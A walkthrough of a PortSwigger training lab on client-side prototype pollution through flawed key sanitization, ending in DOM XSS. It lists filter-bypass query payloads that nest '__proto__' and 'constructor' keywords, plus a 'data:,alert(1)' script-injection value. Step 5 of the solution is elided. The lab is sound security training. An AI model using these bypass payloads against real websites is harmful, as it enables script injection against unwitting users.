# Lab: Client-side prototype pollution via flawed sanitization

**Official lab URL:** https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization

## Lab idea

This challenge concerns client-side prototype pollution and DOM XSS despite attempted key sanitization. It practices assessing whether input filtering covers all relevant property paths and connecting a pollution source to unsafe application behavior.

## Vulnerability in brief
Prototype pollution is a JavaScript vulnerability class in which attacker-controlled input changes properties on an object prototype, most often the global `Object.prototype`. Other objects may then inherit those properties through JavaScript's prototype chain. A common cause is recursively merging an input object into an existing object without safely handling special property keys such as `__proto__` or constructor-related paths. Potential sources include URL query or fragment data, JSON input, and web messages.

## Solution idea
1. In your browser, try polluting Object.prototype by injecting an arbitrary property via the query string: /?__proto__.foo=bar
2. Open the browser DevTools panel and go to the Console tab.
3. Enter Object.prototype .
4. Study the properties of the returned object and observe that your injected foo property has not been added.
- …
6. In the browser DevTools panel, go to the Elements tab and study the HTML content of the page.
7. Modify the payload in the URL to inject an XSS proof-of-concept.
8. Observe that the alert(1) is called and the lab is solved.

## Payloads / key values
- `Object.prototype`
- `/?__proto__.foo=bar`
- `foo`
- `/?__proto__[foo]=bar /?constructor.prototype.foo=bar`
- `deparamSanitized.js`
- `sanitizeKey()`
- `searchLoggerFiltered.js`
- `/?__pro__proto__to__[foo]=bar /?__pro__proto__to__.foo=bar /?constconstructorructor[protoprototypetype][foo]=bar /?constconstructorructor.protoprototypetype.foo=bar`
- `bar`
- `searchLogger.js`
- `config`
- `transport_url`
- `/?__pro__proto__to__[transport_url]=foo`
- `src`
- `data:`
- `/?__pro__proto__to__[transport_url]=data:,alert(1);`
- `alert(1)`

## Official source
- [PortSwigger Academy: Lab: Client-side prototype pollution via flawed sanitization](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization)
